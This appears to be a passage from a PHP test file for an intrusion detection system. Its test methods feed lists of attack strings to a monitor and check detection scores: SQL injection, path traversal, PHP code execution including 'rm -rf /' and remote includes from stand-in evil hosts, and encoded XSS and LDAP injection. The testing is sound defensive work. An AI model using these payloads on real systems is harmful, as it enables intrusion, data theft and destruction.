        $exploits[] = "aa'or LOCALTIME!='0";
        $exploits[] = "aa'like-'aa";
        $exploits[] = "aa'is\N|!'";
        $exploits[] = "'is\N-!'";
        $exploits[] = "asd'|column&&'1";
        $exploits[] = "asd'|column!='";
        $exploits[] = "aa'or column=column -- #aa";
        $exploits[] = "aa'or column*column!='0";
        $exploits[] = "aa'or column like column -- #a";
        $exploits[] = "0'*column is \N - '1";
        $exploits[] = "1'*column is \N or '1";
        $exploits[] = "1'*@a is \N - '";
        $exploits[] = "1'*@a is \N or '1";
        $exploits[] = "1' -1 or+1= '+1 ";
        $exploits[] = "1' -1 - column or '1 ";
        $exploits[] = "1' -1 or '1";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertImpact($result, 604, 646);
    }

    public function testSQLIList3() {

        $exploits = array();
        $exploits[] = "' OR UserID IS NOT 2";
        $exploits[] = "' OR UserID IS NOT NULL";
        $exploits[] = "' OR UserID > 1";
        $exploits[] = "'  OR UserID RLIKE  '.+' ";
        $exploits[] = "'OR UserID <> 2";
        $exploits[] = "1' union (select password from users) -- -a";
        $exploits[] = "1' union (select'1','2',password from users) -- -a";
        $exploits[] = "1' union all (select'1',password from users) -- -a";
        $exploits[] = "aa'!='1";
        $exploits[] = "aa'!=~'1";
        $exploits[] = "aa'=('aa')#(";
        $exploits[] = "aa'|+'1";
        $exploits[] = "aa'|!'aa";
        $exploits[] = "aa'^!'aa ";
        $exploits[] = "abc' = !!'0";
        $exploits[] = "abc' = !!!!'0";
        $exploits[] = "abc' = !!!!!!!!!!!!!!'0";
        $exploits[] = "abc' = !0 = !!'0";
        $exploits[] = "abc' = !0 != !!!'0";
        $exploits[] = "abc' = !+0 != !'0 ";
        $exploits[] = "aa'=+'1";
        $exploits[] = "';if 1=1 drop database test-- -a";
        $exploits[] = "';if 1=1 drop table users-- -a";
        $exploits[] = "';if 1=1 shutdown-- -a";
        $exploits[] = "'; while 1=1 shutdown-- -a";
        $exploits[] = "'; begin shutdown end-- -a ";
        $exploits[] = "'+COALESCE('admin') and 1 = !1 div 1+'";
        $exploits[] = "'+COALESCE('admin') and @@version = !1 div 1+'";
        $exploits[] = "'+COALESCE('admin') and @@version = !@@version div @@version+'";
        $exploits[] = "'+COALESCE('admin') and 1 =+1 = !true div @@version+'";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(612, $result->getImpact());
    }

    public function testSQLIList4() {

        $exploits = array();

        $exploits[] = "aa'in (0)#(";
        $exploits[] = "aa'!=ascii(1)#(";
        $exploits[] = "' or SOUNDEX (1) != '0";
        $exploits[] = "aa'RLIKE BINARY 0#(";
        $exploits[] = "aa'or column!='1";
        $exploits[] = "aa'or column DIV 0 =0 #";
        $exploits[] = "aa'or column+(1)='1";
        $exploits[] = "aa'or 0!='0";
        $exploits[] = "aa'LIKE'0";
        $exploits[] = "aa'or id ='\\'";
        $exploits[] = "1';declare @# int;shutdown;set @# = '1";
        $exploits[] = "1';declare @@ int;shutdown;set @@ = '1";
        $exploits[] = "asd' or column&&'1";
        $exploits[] = "asd' or column= !1 and+1='1";
        $exploits[] = "aa'!=ascii(1) or-1=-'1";
        $exploits[] = "a'IS NOT NULL or+1=+'1";
        $exploits[] = "aa'in('aa') or-1!='0";
        $exploits[] = "aa' or column=+!1 #1";
        $exploits[] = "aa' SOUNDS like+'1";
        $exploits[] = "aa' REGEXP+'0";
        $exploits[] = "aa' like+'0";
        $exploits[] = "-1'=-'+1";
        $exploits[] = "'=+'";
        $exploits[] = "aa' or stringcolumn= +!1 #1 ";
        $exploits[] = "aa' or anycolumn ^ -'1";
        $exploits[] = "aa' or intcolumn && '1";
        $exploits[] = "asd' or column&&'1";
        $exploits[] = "asd' or column= !1 and+1='1";
        $exploits[] = "aa' or column=+!1 #1";
        $exploits[] = "aa'IS NOT NULL or+1^+'0";
        $exploits[] = "aa'IS NOT NULL or +1-1 xor'0";
        $exploits[] = "aa'IS NOT NULL or+2-1-1-1 !='0";
        $exploits[] = "aa'|1+1=(2)Or(1)='1";
        $exploits[] = "aa'|3!='4";
        $exploits[] = "aa'|ascii(1)+1!='1";
        $exploits[] = "aa'|LOCALTIME*0!='1 ";
        $exploits[] = "asd' |1 != (1)#aa";
        $exploits[] = "' is 99999 = '";
        $exploits[] = "' is 0.00000000000 = '";
        $exploits[] = "1'*column-0-'0";
        $exploits[] = "1'-@a or'1";
        $exploits[] = "a'-@a=@a or'1";
        $exploits[] = "aa' *@var or 1 SOUNDS LIKE (1)|'1";
        $exploits[] = "aa' *@var or 1 RLIKE (1)|'1 ";
        $exploits[] = "a' or~column like ~1|'1";
        $exploits[] = "'<~'";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertImpact($result, 753, 757);
    }

    public function testSQLIList5() {

        $exploits = array();

        $exploits[] = "aa'/1 DIV 1 or+1=+'1 ";
        $exploits[] = "aa'&0+1='aa";
        $exploits[] = "aa' like(0) + 1-- -a ";
        $exploits[] = "aa'^0+0='0";
        $exploits[] = "aa'^0+0+1-1=(0)-- -a";
        $exploits[] = "aa'<3+1 or+1=+'1";
        $exploits[] = "aa'%1+0='0";
        $exploits[] = "'/1/1='";
        $exploits[] = " aa'/1 or '1";
        $exploits[] = " aa1' * @a or '1 '/1 regexp '0";
        $exploits[] = " ' / 1 / 1 ='";
        $exploits[] = " '/1='";
        $exploits[] = " aa'&0+1 = 'aa";
        $exploits[] = " aa'&+1='aa";
        $exploits[] = " aa'&(1)='aa";
        $exploits[] = " aa'^0+0 = '0";
        $exploits[] = " aa'^0+0+1-1 = (0)-- -a";
        $exploits[] = " aa'^+-3 or'1";
        $exploits[] = " aa'^0!='1";
        $exploits[] = " aa'^(0)='0";
        $exploits[] = " aa' < (3) or '1";
        $exploits[] = " aa' <<3 or'1";
        $exploits[] = " aa'-+!1 or '1";
        $exploits[] = " aa'-!1 like'0";
        $exploits[] = " aa' % 1 or '1";
        $exploits[] = " aa' / '1' < '3";
        $exploits[] = " aa' / +1 < '3";
        $exploits[] = " aa' - + ! 2 != + - '1";
        $exploits[] = " aa' - + ! 1 or '1";
        $exploits[] = " aa' / +1 like '0";
        $exploits[] = " ' / + (1) / + (1) ='";
        $exploits[] = " aa' & +(0)-(1)='aa";
        $exploits[] = " aa' ^+ -(0) + -(0) = '0";
        $exploits[] = " aa' ^ + - 3 or '1";
        $exploits[] = " aa' ^ +0!='1";
        $exploits[] = " aa' < +3 or '1";
        $exploits[] = " aa' % +1 or '1";
        $exploits[] = "aa'or column*0 like'0";
        $exploits[] = "aa'or column*0='0";
        $exploits[] = "aa'or current_date*0";
        $exploits[] = "1'/column is not null - ' ";
        $exploits[] = "1'*column is not \N - ' ";
        $exploits[] = "1'^column is not null - ' ";
        $exploits[] = "'is\N - '1";
        $exploits[] = "aa' is 0 or '1";
        $exploits[] = "' or MATCH username AGAINST ('+admin -a' IN BOOLEAN MODE); -- -a";
        $exploits[] = "' or MATCH username AGAINST ('a* -) -+ ' IN BOOLEAN MODE); -- -a";
        $exploits[] = "1'*@a or '1";
        $exploits[] = "1'*null or '1";
        $exploits[] = "1'*UTC_TIME or '1";
        $exploits[] = "1'*null is null - '";
        $exploits[] = "1'*@a is null - '";
        $exploits[] = "1'*@@version*-0%20=%20'0";
        $exploits[] = "1'*current_date rlike'0";
        $exploits[] = "aa'/current_date in (0) -- -a";
        $exploits[] = "aa' / current_date regexp '0";
        $exploits[] = "aa' / current_date != '1";
        $exploits[] = "1' or current_date*-0 rlike'1";
        $exploits[] = "0' / current_date XOR '1";
        $exploits[] = "'or not'";
        $exploits[] = "'or not false #aa";
        $exploits[] = "1' * id - '0";
        $exploits[] = "1' *id-'0";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertImpact($result, 920, 933);
    }

    public function testSQLIList6() {

        $exploits = array();

        $exploits[] = "asd'; shutdown; ";
        $exploits[] = "asd'; select null,password,null from users; ";
        $exploits[] = "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user OPEN tablecursor ";
        $exploits[] = "aa aa'; DECLARE tablecursor CURSOR FOR select a.name as c,b.name as d,(null)from sysobjects a,syscolumns b
                        where a.id=b.id and a.xtype = ( 'u' ) and current_user = current_user
                        OPEN tablecursor FETCH NEXT FROM tablecursor INTO @a,@b WHILE(@a != null)
                        @query  = null+null+null+null+ ' UPDATE '+null+@a+null+ ' SET id=null,@b = @payload'
                        BEGIN EXEC sp_executesql @query
                        FETCH NEXT FROM tablecursor INTO @a,@b END
                        CLOSE tablecursor DEALLOCATE tablecursor;
                        and some text, to get pass the centrifuge; and some more text.";
        $exploits[] = "@query  = null+null+null+ ' UPDATE '+null+@a+ ' SET[  '+null+@b+ ' ]  = @payload'";
        $exploits[] = "asd' union distinct(select null,password,null from users)--a ";
        $exploits[] = "asd' union distinct ( select null,password,(null)from user )-- a ";
        $exploits[] = 'DECLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(@S);';
        $exploits[] = "asaa';SELECT[asd]FROM[asd]";
        $exploits[] = "asd'; select [column] from users ";
        $exploits[] = "0x31 union select @@version,username,password from users ";
		$exploits[] = "1 order by if(1<2 ,uname,uid) ";
		$exploits[] = "1 order by ifnull(null,userid) ";
		$exploits[] = "2' between 1 and 3 or 0x61 like 'a";
		$exploits[] = "4' MOD 2 like '0";
		$exploits[] = "-1' /ID having 1< 1 and 1 like 1/'1 ";
		$exploits[] = "2' / 0x62 or 0 like binary '0";
		$exploits[] = "0' between 2-1 and 4-1 or 1 sounds like binary '1 ";
		$exploits[] = "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ";
		$exploits[] = "-1' or substring(null/null,1/null,1) or '1";
		$exploits[] = "1' and 1 = hex(null-1 or 1) or 1 /'null ";		

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(335, $result->getImpact());
    }

    public function testDTList(){

        $test1 = '../../etc/passwd';
        $test2 = '\%windir%\cmd.exe';
        $test3 = '1;cat /e*c/p*d';
        $test4 = '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00';
        $test5 = '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd';
        $test6 = '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini';
        $test7 = 'C:\boot.ini';
        $test8 = '../../../../../../../../../../../../localstart.asp%00';
        $test9 = '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini';
        $test10 = '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;';
        $test11 = '../../../../../../../../conf/server.xml';
        $test12 = '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd';

        if (function_exists('get_magic_quotes_gpc') and @get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
            $test3 = addslashes($test3);
            $test4 = addslashes($test4);
            $test5 = addslashes($test5);
            $test6 = addslashes($test6);
            $test7 = addslashes($test7);
            $test8 = addslashes($test8);
            $test9 = addslashes($test9);
            $test10 = addslashes($test10);
            $test11 = addslashes($test11);
            $test12 = addslashes($test12);
        }

        $exploits = array();
        $exploits[] = $test1;
        $exploits[] = $test2;
        $exploits[] = $test3;
        $exploits[] = $test4;
        $exploits[] = $test5;
        $exploits[] = $test6;
        $exploits[] = $test7;
        $exploits[] = $test8;
        $exploits[] = $test9;
        $exploits[] = $test10;
        $exploits[] = $test11;
        $exploits[] = $test12;

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(121, $result->getImpact());
    }

    public function testURIList(){

        $exploits = array();
        $exploits[] = 'firefoxurl:test|"%20-new-window%20file:\c:/test.txt';
        $exploits[] = 'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"';
        $exploits[] = 'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"';
        $exploits[] = 'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)';
        $exploits[] = 'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210';
        $exploits[] = 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertImpact($result, 131, 136);
    }

    public function testRFEList() {

        $exploits = array();
        $exploits[] = ';phpinfo()';
        $exploits[] = '@phpinfo()';
        $exploits[] = '"; <?php exec("rm -rf /"); ?>';
        $exploits[] = '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');';
        $exploits[] = ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))';
        $exploits[] = '; include "http://evilsite.com/evilcode"';
        $exploits[] = '; rm -rf /\0';
        $exploits[] = '"; $_a=(! \'a\') . "php"; $_a.=(! \'a\') . "info"; $_a(1); $b="';
        $exploits[] = '";
                        define ( _a, "0008avwga000934mm40re8n5n3aahgqvaga0a303") ;
                        if  ( !0) $c = USXWATKXACICMVYEIkw71cLTLnHZHXOTAYADOCXC ^ _a;
                        if  ( !0) system($c) ;//';
        $exploits[] = '" ; //
                        if (!0) $_a ="". str_rot13(\'cevags\'); //
                        $_b = HTTP_USER_AGENT; //
                        $_c="". $_SERVER[$_b]; //
                        $_a( `$_c` );//';
        $exploits[] = '"; //
                        $_c = "" . $_a($b);
                        $_b(`$_c`);//';
        $exploits[] = '" ; //
                        if  (!0) $_a = base64_decode ;
                        if  (!0) $_b = parse_str ; //
                        $_c = "" . strrev("ftnirp");
                        if  (!0)  $_d = QUERY_STRING; //
                        $_e= "" . $_SERVER[$_d];
                        $_b($_e); //
                        $_f = "" . $_a($b);
                        $_c(`$_f`);//';
        $exploits[] = '" ; //
                        $_y = "" . strrev("ftnirp");
                        if  (!0)    $_a = base64_decode ;
                        if  (!0)    $_b="" . $_a(\'cHdk\');
                        if (!0) $_y(`$_b`);//';
        $exploits[] = '";{ if (true) $_a  = "" . str_replace(\'!\',\'\',\'s!y!s!t!e!m!\');
                        $_a( "dir"); } //';
        $exploits[] = '";{ if (true) $_a  = "" . strtolower("pass");
                        if   (1) $_a.= "" . strtolower("thru");
                        $_a( "dir"); } //';
        $exploits[] = '";{if (!($_b[]++%1)) $_a[]  = system;
                        $_a[0]( "ls"); } //';
        $exploits[] = '";{if (pi) $_a[]  = system;
                        $_a[0]( "ls");  } //';
        $exploits[] = '";; //
                        if (!($_b[]  %1)) $_a[0]  = system;
                        $_a[0](!a. "ls");  //';
        $exploits[] = '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//';
        $exploits[] = 'aaaa { $ {`wget hxxp://example.com/x.php`}}';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertImpact($result, 512, 507);
    }

    public function testUTF7List() {

        $exploits = array();
        $exploits[] = '+alert(1)';
        $exploits[] = 'ACM=1,1+eval(1+name+(+ACM-1),ACM)';
        $exploits[] = '1+eval(1+name+(+1-1),-1)';
        $exploits[] = 'XSS without being noticed<a/href=da&#x74&#97:text/html&#59&#x63harset=UTF-7&#44+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAPAAvAHMAYwByAGkAcAB0AD4->test';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(71, $result->getImpact());
    }

    public function testBase64CCConverter() {

        $exploits = array();
        $exploits[] = 'PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4==';
        $exploits[] = '<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64a&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>';
        $exploits[] = '<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>';
        $exploits[] = '<applet src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4" type=text/html>';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(95, $result->getImpact());
    }

    public function testDecimalCCConverter() {

        $exploits = array();
        $exploits[] = '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;';
        $exploits[] = '60,115,99,114,105,112,116,62,97,108,100+1,114,116,40,49,41,60,47,115,99,114,105,112,116,62';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(67, $result->getImpact());
    }

    public function testOctalCCConverter() {

        $test1 = '\47\150\151\47\51\74\57\163\143\162\151\160\164\76';
        $test2 = '\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\150\151\47\51\74\57\163\143\162\151\160\164\76';

        if (function_exists('get_magic_quotes_gpc') and @get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
        }

        $exploits = array();
        $exploits[] = $test1;
        $exploits[] = $test2;

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(48, $result->getImpact());
    }

    public function testHexCCConverter() {
        $test1 = '&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29';
        $test2 = ';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;';
        $test3 = '\x0000003c\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e\x0000061\x000006c\x0000065\x0000072\x0000074\x0000028\x0000032\x0000029\x000003c\x000002f\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e';
        $test4 = 'x=&#x65&#x76&#x61&#x6c,y=&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29
                    x(y)';
        $test5 = 'j&#97vascrip&#x74&#58ale&#x72&#x74&#x28&#x2F&#x58&#x53&#x53&#x20&#x50&#x55&#x4E&#x43&#x48&#x21&#x2F&#x29';

        if (function_exists('get_magic_quotes_gpc') and @get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
            $test3 = addslashes($test3);
            $test4 = addslashes($test4);
            $test5 = addslashes($test5);
        }

        $exploits = array();
        $exploits[] = $test1;
        $exploits[] = $test2;
        $exploits[] = $test3;
        $exploits[] = $test4;
        $exploits[] = $test5;

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(106, $result->getImpact());
    }

    public function testLDAPInjectionList() {

        $exploits = array();
        $exploits[] = "*(|(objectclass=*))";
        $exploits[] = "*)(uid=*))(|(uid=*";
        $exploits[] = "*))));";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(20, $result->getImpact());
    }

    public function testAllowedHTMLScanningPositive() {

        $exploits = array();
        $exploits['html_1'] = '<a/onmouseover=alert(document.cookies) href="http://www.google.de/">Google</a>';
        $exploits['html_2'] = '<table width="500"><tr><th>Test</th><iframe/onload=alert(1)> </tr><tr><td>test</td></tr></table>';
        $exploits['html_3'] = '<table>
                             <tr>
                             <td class="TableRowAlt">
                             <img src="templates/default/images/carat.gif" border="0" width="8" height="8" alt="" style="vertical-align: middle;" />&nbsp;                                <a href="http://sla.ckers.org/forum/read.php?13,22665">FEEDBACK on my thesis on Session Management: SESSION FIXATION</a>
                             </td>
                             <td class="TableRowAlt" align="center">81&nbsp;</td>
                             <td class="TableRowAlt" align="center" nowrap="nowrap">1&nbsp;</td>
                             <td class="TableRowAlt" nowrap="nowrap"><a href="http://sla.ckers.org/forum/">euronymous</a></td>
                             <td class="TableRowAlt SmallFont" nowrap="nowrap">
                             06/01/2008 04:05AM<br />
                             <span class="ListSubText">
                             <a href="http://sla.ckers.org/forum/read.php?13,22665,22665#msg-22665">Last Post</a> by <a href="http://sla.ckers.org/forum/profile.php?13,1410">euronymous</a>        </span>
                             </td>
                             </tr>
                              </table><base href="http://attacker.com/collect.php" />';
        $exploits['html_4'] = '<div style="-moz-binding:url(http://h4k.in/mozxss.xml#xss)">hello!</div>';
        $exploits['html_5'] = '<img src="javascript:alert(1)">';
        $exploits['html_6'] = '<script>alert(1)</script><h1>headline</h1><p>copytext</p>';
        $exploits['html_7'] = '<img src src src src=x onerror=alert(1)>';
        $exploits['html_8'] = '<img src=1 onerror=alert(1) alt=1>';
        $exploits['html_8'] = '<b>\' OR 1=1-</b>-';

        $this->init->config['General']['HTML_Purifier_Cache'] = dirname(__FILE__) . '/../../lib/IDS/tmp/';
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $test->setHtml(array_keys($exploits));
        $result = $test->run();
        $this->assertFalse($result->hasEvent(1));
        $this->assertEquals(163, $result->getImpact());
    }

    public function testAllowedHTMLScanningNegative() {
        $exploits = array();
        $exploits['html_1'] = '<a href="http://www.google.de/">Google</a>';
        $exploits['html_2'] = '<table width="500"><tr><th>Test</th></tr><tr><td>test</td></tr></table>';
        $exploits['html_3'] = '<table><tr><td class="TableRowAlt">
                                <img src="templates/default/images/carat.gif" border="0" width="8" height="8" alt="" style="vertical-align:middle;" />                                 <a href="http://sla.ckers.org/forum/read.php?13,22665">FEEDBACK on my thesis on Session Management: SESSION FIXATION</a>
                                </td>
